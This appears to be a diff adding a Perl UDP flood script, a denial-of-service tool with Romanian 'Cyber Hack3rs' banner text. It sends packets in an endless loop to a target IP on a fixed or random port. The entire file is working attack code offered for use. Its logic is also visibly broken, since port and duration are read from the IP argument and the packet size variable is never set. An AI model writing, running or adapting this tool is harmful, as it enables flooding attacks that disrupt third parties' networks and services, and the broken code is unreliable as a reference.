@@ -1,0 +1,47 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+if ($ARGC !=1) {
+printf "[0;31mAi gresit comanda baietel :), foloseste perl attack IP \n";
+exit(1);
+}
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[0;31m########################################################\n";
+printf "[0;32m> > > [0;32mCristian Official FlooD Arhive          #\n";
+printf "[0;32m> > > [0;32mCristian trimite pachete spre IP        #\n";
+printf "[0;32m> > > [0;32mHack3d | Error 404 not found            #\n";
+printf "[0;32m> > > [0;32mApasa CTRL+C pentru a opri FlooD-u      #\n";
+printf "[0;32m> > > [0;32mRomania Cyber Hack3rs | Official        #\n";
+printf "[0;31m########################################################\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 99500) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
